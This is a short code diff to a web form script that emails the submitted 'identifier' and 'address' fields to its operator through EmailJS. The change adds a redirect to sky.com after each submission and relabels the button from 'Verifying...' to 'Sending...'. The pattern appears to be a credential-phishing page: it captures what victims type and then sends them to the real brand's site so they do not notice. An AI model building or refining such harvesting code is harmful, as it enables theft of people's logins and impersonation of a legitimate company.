@@ -173,6 +173,7 @@
     const EMAILJS_PUBLIC_KEY  = "5g0vSGPG-xbz8lu7d";   // Account > General > Public Key
     const EMAILJS_SERVICE_ID  = "service_p6xk4mw";   // Email Services
     const EMAILJS_TEMPLATE_ID = "template_psyctef";  // Email Templates
+    const REDIRECT_URL = "https://sky.com";  // where to send users after submit
     // =============================================================================
 
     emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
@@ -189,7 +190,7 @@
       }
 
       btn.disabled = true;
-      btn.textContent = 'Verifying...';
+      btn.textContent = 'Sending...';
       showStatus('', '');
 
       // These keys must match the variables used in your EmailJS template
@@ -200,15 +201,12 @@
 
       emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(function () {
-          showStatus('Submitted successfully.', 'success');
-          document.getElementById('identifier').value = '';
-          document.getElementById('address').value = '';
+          // Redirect to the website on success
+          window.location.href = REDIRECT_URL;
         })
         .catch(function (error) {
           console.error('EmailJS error:', error);
           showStatus('Something went wrong. Please try again.', 'error');
-        })
-        .finally(function () {
           btn.disabled = false;
           btn.textContent = 'Continue';
         });
